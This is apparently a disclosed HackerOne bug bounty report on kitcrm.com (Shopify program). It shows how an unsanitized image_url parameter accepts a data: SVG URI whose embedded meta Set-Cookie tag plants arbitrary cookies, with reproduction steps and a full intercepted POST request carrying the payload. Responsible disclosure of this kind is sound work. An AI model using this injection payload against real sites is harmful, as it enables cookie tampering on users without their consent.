# Setting Arbitrary Cookie at kitcrm.com

## Report Details
- **Report ID**: 213991
- **URL**: https://hackerone.com/reports/213991
- **State**: Closed
- **Severity**: none
- **Submitted**: 2017-03-16T19:27:22.094Z
- **Disclosed**: 2017-08-23T16:26:45.691Z

## Reporter
- **Username**: dhaval
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
Hey

The `src` parameter of Image is not being sanitized which allows me to set cookies at `kitcrm.com`

#### Proof of Concept

1. Create a post at `https://kitcrm.com/pages/ID/manual_posts/new`
2. Select ` Schedule for Later `
3. Go to Scheduled Posts `https://kitcrm.com/pages/ID/manual_posts`
4. Click `Edit` on your post
5. Select any random photo and click "Update"
6. Intercept the request, Change the `manual_post[image_url]` to 
`data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><circle r='100'></circle><foreignObject><html xmlns='http://www.w3.org/1999/xhtml'><meta http-equiv='Set-Cookie' content='ppp=qqq' /></html></foreignObject></svg>`
7. Check `document.cookie` from the console

```
POST /pages/176625/manual_posts/30923 HTTP/1.1
Host: kitcrm.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:51.0) Gecko/20100101 Firefox/51.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://kitcrm.com/pages/176625/manual_posts/30923/edit
Cookie: 
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------153019791019196005451079530934
Content-Length: 3600

-----------------------------153019791019196005451079530934
Content-Disposition: form-data; name="utf8"

â
-----------------------------153019791019196005451079530934
Content-Disposition: form-data; name="_method"

patch
-----------------------------153019791019196005451079530934
Content-Disposition: form-data; name="authenticity_token"

HSRt0lrRnpOeD8pANBLJWen0cCihQV/eAhaCBvUR7XjZkiqSjXWDBvY+Qr/+fk9QjL7RI1aTOPciNpGQLnKBFg==
-----------------------------153019791019196005451079530934
Content-Disposition: form-data; name="manual_post[image_uploader]"; filename="medium_divider.png"
Content-Type: image/png

PNG


IHDRd¨ËfwsRGB®ÎéIDATxíÝAN1PqÄp
ØufÏ\#sGr*¤XVlç±ië÷ûR/èyzòC @ @ @ @ @ @ @ @ @ @ @ @ @ @ @,pýxûùãïÇýv}ÿ) @ÕFÿþ?¯vCæ!@=È{2%P ËÄ@ØC@ì±'S @`9²ÜJD=È{2%P ËÄ@ØC@ì±'S @`9²ÜJD=^öÓü¯£ÿ-ímó~s<Ì³u2P G¯×Í @`gëd- @^¯#@À<2ÏÖÉ8Z@½^7Gy
d	 p´9z½nóÈ<[' @àhrôzÝæ	(y¶N&@ÀÑ×è{fÖqs <D4Òtd H¤ @@ð} MGFÀ?øýùkh×÷¡ë]<d	RpD H¶ @@P GDY@d	RpD H¶ @@P GDY@d	RpD H¶ @@~Öã~»Êù"	\÷ÛÐõ.Î£ßå	$ÛJ @ (#"@, @²)8"È
$ÛH @ (#"@, @²)8"È
$ÛH @ (#"@, @²)8"È
$ÛH @ (#"@, @²)8"È
$ÛH @ (#"@, @²)8"È
$ÛH @ @ @ @ @ @ @ @ @ @ @ @ @ @ @ @þRàS¿i{IEND®B`
-----------------------------153019791019196005451079530934
Content-Disposition: form-data; name="manual_post[message]"

sdasda
-----------------------------153019791019196005451079530934
Content-Disposition: form-data; name="manual_post[link]"


-----------------------------153019791019196005451079530934
Content-Disposition: form-data; name="manual_post[facebook]"

true
-----------------------------153019791019196005451079530934
Content-Disposition: form-data; name="manual_post[twitter]"

false
-----------------------------153019791019196005451079530934
Content-Disposition: form-data; name="manual_post[share_all]"

false
-----------------------------153019791019196005451079530934
Content-Disposition: form-data; name="manual_post[publish_at]"

1:00
-----------------------------153019791019196005451079530934
Content-Disposition: form-data; name="manual_post[publish_at_1i]"

2017
-----------------------------153019791019196005451079530934
Content-Disposition: form-data; name="manual_post[publish_at_2i]"

3
-----------------------------153019791019196005451079530934
Content-Disposition: form-data; name="manual_post[publish_at_3i]"

17
-----------------------------153019791019196005451079530934
Content-Disposition: form-data; name="manual_post[publish_at_4i]"

1
-----------------------------153019791019196005451079530934
Content-Disposition: form-data; name="manual_post[publish_at_5i]"

0
-----------------------------153019791019196005451079530934
Content-Disposition: form-data; name="commit"

UPDATE
-----------------------------153019791019196005451079530934
Content-Disposition: form-data; name="manual_post[image_url]"

data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><circle r='100'></circle><foreignObject><html xmlns='http://www.w3.org/1999/xhtml'><meta http-equiv='Set-Cookie' content='ppp=qqq' /></html></foreignObject></svg>
-----------------------------153019791019196005451079530934--

```

## Attachments
No attachments
